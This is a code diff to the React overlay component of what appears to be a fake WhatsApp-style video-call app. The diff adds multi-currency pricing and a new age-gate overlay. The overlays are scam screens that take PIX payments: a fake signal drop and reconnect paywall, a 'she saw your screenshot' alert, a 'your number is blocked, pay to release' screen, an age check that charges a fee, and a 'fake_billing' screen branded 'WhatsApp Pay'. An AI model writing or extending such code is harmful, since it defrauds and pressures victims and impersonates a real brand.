@@ -3,6 +3,7 @@ import { useParams, useNavigate } from 'react-router-dom';
 import QRCode from 'qrcode';
 import { createPixPayment, checkPixStatus, type BillingResult } from '../services/billingService';
 import type { PublicEvent } from '../services/callService';
+import { formatPrice } from '../lib/currency';
 
 function useQRCode(text: string | undefined) {
   const [dataUrl, setDataUrl] = useState<string>('');
@@ -20,15 +21,13 @@ interface Props {
   event: PublicEvent;
   onDismiss: () => void;
   onResume?: () => void;
+  currency?: string;
 }
 
 /* ─── PIX QR code step ─────────────────────────────────────────────────── */
 
-function formatBRL(cents: number) {
-  return (cents / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
-}
 
-function PixStep({ slug, event, onDismiss, onPaid }: { slug: string; event: PublicEvent; onDismiss: () => void; onPaid?: () => void }) {
+function PixStep({ slug, event, onDismiss, onPaid, currency = 'BRL' }: { slug: string; event: PublicEvent; onDismiss: () => void; onPaid?: () => void; currency?: string }) {
   const hasPreset =
     !!event.billing_payer_name &&
     !!event.billing_payer_document &&
@@ -191,7 +190,7 @@ function PixStep({ slug, event, onDismiss, onPaid }: { slug: string; event: Publ
 
         {/* Valor */}
         <div className="text-center">
-          <p className="text-3xl font-black text-white tracking-tight">{formatBRL(result.amount_cents)}</p>
+          <p className="text-3xl font-black text-white tracking-tight">{formatPrice(result.amount_cents, currency)}</p>
           <p className="text-gray-400 text-xs mt-0.5">Pagamento via PIX • instantâneo</p>
         </div>
 
@@ -293,7 +292,7 @@ function PixStep({ slug, event, onDismiss, onPaid }: { slug: string; event: Publ
           <p className="text-gray-400 text-sm">{event.description}</p>
         )}
         {event.billing_amount_cents > 0 && (
-          <p className="text-[#25d366] font-bold text-2xl">{formatBRL(event.billing_amount_cents)}</p>
+          <p className="text-[#25d366] font-bold text-2xl">{formatPrice(event.billing_amount_cents, currency)}</p>
         )}
       </div>
 
@@ -496,7 +495,9 @@ function SignalDropOverlay({ event, onDismiss }: { event: PublicEvent; onDismiss
             <path d="M1 1l22 22M16.72 11.06A10.94 10.94 0 0119 12.55M5 12.55a10.94 10.94 0 015.17-2.39M10.71 5.05A16 16 0 0122.56 9M1.42 9a15.91 15.91 0 014.7-2.88M8.53 16.11a6 6 0 016.95 0M12 20h.01" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
           </svg>
           <span className="text-white text-xs font-medium">
-            {phase === 'static' ? `Sinal fraco${dots}` : `Reconectando${dots}`}
+            {phase === 'static'
+              ? `${event.title || 'Sinal fraco'}${dots}`
+              : `${event.description || 'Reconectando'}${dots}`}
           </span>
         </div>
       </div>
@@ -506,7 +507,7 @@ function SignalDropOverlay({ event, onDismiss }: { event: PublicEvent; onDismiss
 
 /* ─── Reconnect Paywall Overlay ─────────────────────────────────────────── */
 
-function ReconnectPaywallOverlay({ event, onDismiss, slug }: { event: PublicEvent; onDismiss: () => void; slug: string }) {
+function ReconnectPaywallOverlay({ event, onDismiss, slug, currency = 'BRL' }: { event: PublicEvent; onDismiss: () => void; slug: string; currency?: string }) {
   type Phase = 'lost' | 'trying' | 'failed' | 'payment';
   const [phase, setPhase] = useState<Phase>('lost');
   const [attempt, setAttempt] = useState(0);
@@ -617,7 +618,7 @@ function ReconnectPaywallOverlay({ event, onDismiss, slug }: { event: PublicEven
           <p className="text-[#8696a0] text-xs">Pagamento via PIX</p>
         </div>
       </div>
-      <PixStep slug={slug} event={event} onDismiss={onDismiss} />
+      <PixStep slug={slug} event={event} onDismiss={onDismiss} currency={currency} />
     </div>
   );
 }
@@ -685,11 +686,12 @@ function UpsellOverlay({ event, onDismiss }: { event: PublicEvent; onDismiss: ()
 
 /* ─── Screenshot Alert ──────────────────────────────────────────────────── */
 
-function ScreenshotAlertOverlay({ onDismiss }: { onDismiss: () => void }) {
+function ScreenshotAlertOverlay({ event, onDismiss }: { event: PublicEvent; onDismiss: () => void }) {
+  const duration = event.duration_seconds > 0 ? event.duration_seconds : 3.5;
   useEffect(() => {
-    const t = setTimeout(onDismiss, 3500);
+    const t = setTimeout(onDismiss, duration * 1000);
     return () => clearTimeout(t);
-  }, [onDismiss]);
+  }, [duration, onDismiss]);
 
   return (
     <div className="absolute inset-0 z-50 bg-red-900/95 flex flex-col items-center justify-center gap-4 px-6"
@@ -702,9 +704,9 @@ function ScreenshotAlertOverlay({ onDismiss }: { onDismiss: () => void }) {
         </svg>
       </div>
       <div className="text-center space-y-2">
-        <p className="text-white text-xl font-black">⚠️ Atenção!</p>
-        <p className="text-red-200 text-base font-semibold">Ela viu que você tentou tirar print!</p>
-        <p className="text-red-300 text-sm">Isso pode encerrar a chamada imediatamente.</p>
+        <p className="text-white text-xl font-black">{event.title || '⚠️ Atenção!'}</p>
+        <p className="text-red-200 text-base font-semibold">{event.description || 'Ela viu que você tentou tirar print!'}</p>
+        {event.button_text && <p className="text-red-300 text-sm">{event.button_text}</p>}
       </div>
     </div>
   );
@@ -734,7 +736,7 @@ function BatteryLowOverlay({ event, onDismiss }: { event: PublicEvent; onDismiss
           </div>
           <div>
             <p className="text-orange-400 font-bold text-sm">Bateria fraca — {pct}%</p>
-            <p className="text-gray-400 text-xs">A chamada pode cair a qualquer momento{dots}</p>
+            <p className="text-gray-400 text-xs">{event.description || `A chamada pode cair a qualquer momento${dots}`}</p>
           </div>
         </div>
         <p className="text-gray-500 text-xs text-center">Toque para fechar</p>
@@ -898,7 +900,7 @@ function ExclusiveAccessOverlay({ event, onDismiss }: { event: PublicEvent; onDi
 
 /* ─── Tip Jar ───────────────────────────────────────────────────────────── */
 
-function TipJarOverlay({ event, onDismiss, onResume, slug }: { event: PublicEvent; onDismiss: () => void; onResume?: () => void; slug: string }) {
+function TipJarOverlay({ event, onDismiss, onResume, slug, currency = 'BRL' }: { event: PublicEvent; onDismiss: () => void; onResume?: () => void; slug: string; currency?: string }) {
   const [selected, setSelected] = useState<number | null>(null);
   const base = event.billing_amount_cents || 1000;
   const amounts = [base, base * 2, base * 5, base * 10];
@@ -913,7 +915,7 @@ function TipJarOverlay({ event, onDismiss, onResume, slug }: { event: PublicEven
           <svg viewBox="0 0 24 24" fill={btnColor} className="w-5 h-5"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
           <span className="text-white font-semibold text-sm">{event.title || 'Presente 🎁'}</span>
         </div>
-        <PixStep slug={slug} event={fakeEvent} onDismiss={onDismiss} onPaid={onResume ?? onDismiss} />
+        <PixStep slug={slug} event={fakeEvent} onDismiss={onDismiss} onPaid={onResume ?? onDismiss} currency={currency} />
       </div>
     );
   }
@@ -932,7 +934,7 @@ function TipJarOverlay({ event, onDismiss, onResume, slug }: { event: PublicEven
           <button key={v} onClick={() => setSelected(v)}
             className={`w-full py-3.5 rounded-xl font-bold text-base transition-all active:scale-95 border-2 ${selected === v ? 'border-transparent text-white' : 'border-white/10 text-white/80 bg-white/5'}`}
             style={selected === v ? { backgroundColor: btnColor, borderColor: btnColor } : {}}>
-            {(v / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}
+            {formatPrice(v, currency)}
           </button>
         ))}
       </div>
@@ -952,7 +954,7 @@ function TipJarOverlay({ event, onDismiss, onResume, slug }: { event: PublicEven
 
 /* ─── Video Lock ────────────────────────────────────────────────────────── */
 
-function VideoLockOverlay({ event, onDismiss, onResume, slug }: { event: PublicEvent; onDismiss: () => void; onResume?: () => void; slug: string }) {
+function VideoLockOverlay({ event, onDismiss, onResume, slug, currency = 'BRL' }: { event: PublicEvent; onDismiss: () => void; onResume?: () => void; slug: string; currency?: string }) {
   const [paying, setPaying] = useState(false);
   const btnColor = event.button_color ?? '#6366f1';
 
@@ -963,7 +965,7 @@ function VideoLockOverlay({ event, onDismiss, onResume, slug }: { event: PublicE
           <svg viewBox="0 0 24 24" fill="white" className="w-5 h-5"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
           <span className="text-white font-semibold text-sm">Desbloquear vídeo</span>
         </div>
-        <PixStep slug={slug} event={event} onDismiss={onDismiss} onPaid={onResume ?? onDismiss} />
+        <PixStep slug={slug} event={event} onDismiss={onDismiss} onPaid={onResume ?? onDismiss} currency={currency} />
       </div>
     );
   }
@@ -981,7 +983,7 @@ function VideoLockOverlay({ event, onDismiss, onResume, slug }: { event: PublicE
         <p className="text-white text-xl font-bold">{event.title || 'Vídeo bloqueado'}</p>
         <p className="text-gray-300 text-sm">{event.description || 'Continue para desbloquear o momento'}</p>
         {event.billing_amount_cents > 0 && (
-          <p className="text-indigo-400 font-bold text-2xl">{formatBRL(event.billing_amount_cents)}</p>
+          <p className="text-indigo-400 font-bold text-2xl">{formatPrice(event.billing_amount_cents, currency)}</p>
         )}
       </div>
       <button onClick={() => setPaying(true)}
@@ -995,7 +997,7 @@ function VideoLockOverlay({ event, onDismiss, onResume, slug }: { event: PublicE
 
 /* ─── Phone Block ───────────────────────────────────────────────────────── */
 
-function PhoneBlockOverlay({ event, onDismiss, onResume, slug }: { event: PublicEvent; onDismiss: () => void; onResume?: () => void; slug: string }) {
+function PhoneBlockOverlay({ event, onDismiss, onResume, slug, currency = 'BRL' }: { event: PublicEvent; onDismiss: () => void; onResume?: () => void; slug: string; currency?: string }) {
   const [paying, setPaying] = useState(false);
   const btnColor = event.button_color ?? '#ef4444';
 
@@ -1006,7 +1008,7 @@ function PhoneBlockOverlay({ event, onDismiss, onResume, slug }: { event: Public
           <svg viewBox="0 0 24 24" fill="white" className="w-5 h-5"><path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.6.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1C10.6 21 3 13.4 3 4c0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.3.2 2.5.6 3.6.1.3 0 .7-.2 1L6.6 10.8z" transform="rotate(45 12 12)"/></svg>
           <span className="text-white font-semibold text-sm">Liberar número</span>
         </div>
-        <PixStep slug={slug} event={event} onDismiss={onDismiss} onPaid={onResume ?? onDismiss} />
+        <PixStep slug={slug} event={event} onDismiss={onDismiss} onPaid={onResume ?? onDismiss} currency={currency} />
       </div>
     );
   }
@@ -1026,7 +1028,7 @@ function PhoneBlockOverlay({ event, onDismiss, onResume, slug }: { event: Public
         <p className="text-white text-xl font-bold">{event.title || 'Número bloqueado'}</p>
         <p className="text-gray-400 text-sm text-center leading-relaxed">{event.description || 'Seu número foi bloqueado temporariamente. Pague para liberar o contato.'}</p>
         {event.billing_amount_cents > 0 && (
-          <p className="text-red-400 font-bold text-2xl">{formatBRL(event.billing_amount_cents)}</p>
+          <p className="text-red-400 font-bold text-2xl">{formatPrice(event.billing_amount_cents, currency)}</p>
         )}
       </div>
       <button onClick={() => setPaying(true)}
@@ -1038,9 +1040,61 @@ function PhoneBlockOverlay({ event, onDismiss, onResume, slug }: { event: Public
   );
 }
 
+/* ─── Age Gate Overlay ──────────────────────────────────────────────────── */
+
+function AgeGateOverlay({ event, onDismiss, onResume, slug, currency = 'BRL' }: { event: PublicEvent; onDismiss: () => void; onResume?: () => void; slug: string; currency?: string }) {
+  const [paying, setPaying] = useState(false);
+
+  if (paying) {
+    return (
+      <div className="absolute inset-0 bg-[#0b141a] flex flex-col z-50" onClick={e => e.stopPropagation()}>
+        <div className="px-4 py-3 flex items-center gap-3 bg-yellow-900/30">
+          <span className="text-xl">🔞</span>
+          <span className="text-white font-semibold text-sm">Verificação de maioridade</span>
+        </div>
+        <PixStep slug={slug} event={event} onDismiss={onDismiss} onPaid={onResume ?? onDismiss} currency={currency} />
+      </div>
+    );
+  }
+
+  const btnColor = event.button_color ?? '#f59e0b';
+
+  return (
+    <div className="absolute inset-0 z-50 bg-black/95 flex flex-col items-center justify-center gap-5 px-6"
+      onClick={e => e.stopPropagation()}>
+      <div className="relative">
+        <div className="w-24 h-24 rounded-full bg-yellow-500/10 flex items-center justify-center">
+          <span className="text-5xl select-none">🔞</span>
+        </div>
+        <div className="absolute inset-0 rounded-full bg-yellow-500/15 animate-ping" style={{ animationDuration: '2s' }} />
+      </div>
+      <div className="text-center space-y-2">
+        <p className="text-white text-xl font-bold">{event.title || 'Conteúdo +18'}</p>
+        <p className="text-gray-400 text-sm text-center leading-relaxed">{event.description || 'Para confirmar que você é maior de idade, é necessário realizar uma verificação rápida.'}</p>
+        {event.billing_amount_cents > 0 && (
+          <p className="text-yellow-400 font-bold text-2xl">{formatPrice(event.billing_amount_cents, currency)}</p>
+        )}
+      </div>
+      <div className="w-full max-w-xs bg-yellow-500/10 border border-yellow-500/20 rounded-xl px-4 py-3">
+        <p className="text-yellow-300 text-xs text-center leading-relaxed">
+          Uma cobrança simbólica é usada para verificar que você possui um cartão válido registrado em nome de um adulto.
+        </p>
+      </div>
+      <button onClick={() => setPaying(true)}
+        className="w-full max-w-xs py-4 rounded-2xl font-bold text-base active:scale-95 transition-all"
+        style={{ backgroundColor: btnColor, color: '#1a1a1a' }}>
+        {event.button_text || 'Confirmar maioridade'}
+      </button>
+      <button onClick={onDismiss} className="text-gray-600 text-xs hover:text-gray-400 transition-colors">
+        Fechar
+      </button>
+    </div>
+  );
+}
+
 /* ─── Componente principal ──────────────────────────────────────────────── */
 
-export function EventOverlay({ event, onDismiss, onResume }: Props) {
+export function EventOverlay({ event, onDismiss, onResume, currency = 'BRL' }: Props) {
   // Para billing, precisamos do slug da URL para chamar a API pública.
   const { slug } = useParams<{ slug: string }>();
   const btnColor = event.button_color ?? '#25d366';
@@ -1050,7 +1104,7 @@ export function EventOverlay({ event, onDismiss, onResume }: Props) {
   // Auto-dismiss baseado em duration_seconds (0 = nunca auto-dismiss)
   const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   useEffect(() => {
-    if (event.duration_seconds > 0 && event.type !== 'countdown' && event.type !== 'reconnect_paywall' && event.type !== 'signal_drop') {
+    if (event.duration_seconds > 0 && event.type !== 'countdown' && event.type !== 'reconnect_paywall' && event.type !== 'signal_drop' && event.type !== 'age_gate' && event.type !== 'video_lock' && event.type !== 'phone_block' && event.type !== 'tip_jar') {
       timerRef.current = setTimeout(onDismiss, event.duration_seconds * 1000);
     }
     return () => {
@@ -1063,7 +1117,7 @@ export function EventOverlay({ event, onDismiss, onResume }: Props) {
   }
 
   if (event.type === 'reconnect_paywall') {
-    return <ReconnectPaywallOverlay event={event} onDismiss={handleDismiss} slug={slug ?? ''} />;
+    return <ReconnectPaywallOverlay event={event} onDismiss={handleDismiss} slug={slug ?? ''} currency={currency} />;
   }
 
   if (event.type === 'countdown') {
@@ -1125,7 +1179,7 @@ export function EventOverlay({ event, onDismiss, onResume }: Props) {
   }
 
   if (event.type === 'screenshot_alert') {
-    return <ScreenshotAlertOverlay onDismiss={onDismiss} />;
+    return <ScreenshotAlertOverlay event={event} onDismiss={onDismiss} />;
   }
 
   if (event.type === 'battery_low') {
@@ -1153,15 +1207,19 @@ export function EventOverlay({ event, onDismiss, onResume }: Props) {
   }
 
   if (event.type === 'tip_jar') {
-    return <TipJarOverlay event={event} onDismiss={onDismiss} onResume={onResume} slug={slug ?? ''} />;
+    return <TipJarOverlay event={event} onDismiss={onDismiss} onResume={onResume} slug={slug ?? ''} currency={currency} />;
   }
 
   if (event.type === 'video_lock') {
-    return <VideoLockOverlay event={event} onDismiss={onDismiss} onResume={onResume} slug={slug ?? ''} />;
+    return <VideoLockOverlay event={event} onDismiss={onDismiss} onResume={onResume} slug={slug ?? ''} currency={currency} />;
   }
 
   if (event.type === 'phone_block') {
-    return <PhoneBlockOverlay event={event} onDismiss={onDismiss} onResume={onResume} slug={slug ?? ''} />;
+    return <PhoneBlockOverlay event={event} onDismiss={onDismiss} onResume={onResume} slug={slug ?? ''} currency={currency} />;
+  }
+
+  if (event.type === 'age_gate') {
+    return <AgeGateOverlay event={event} onDismiss={onDismiss} onResume={onResume} slug={slug ?? ''} currency={currency} />;
   }
 
   // fake_billing — integração real com ZuckPay PIX
@@ -1181,7 +1239,7 @@ export function EventOverlay({ event, onDismiss, onResume }: Props) {
         <span className="text-white font-semibold text-sm">WhatsApp Pay</span>
       </div>
 
-      <PixStep slug={slug ?? ''} event={event} onDismiss={onDismiss} onPaid={onResume ?? onDismiss} />
+      <PixStep slug={slug ?? ''} event={event} onDismiss={onDismiss} onPaid={onResume ?? onDismiss} currency={currency} />
     </div>
   );
 }
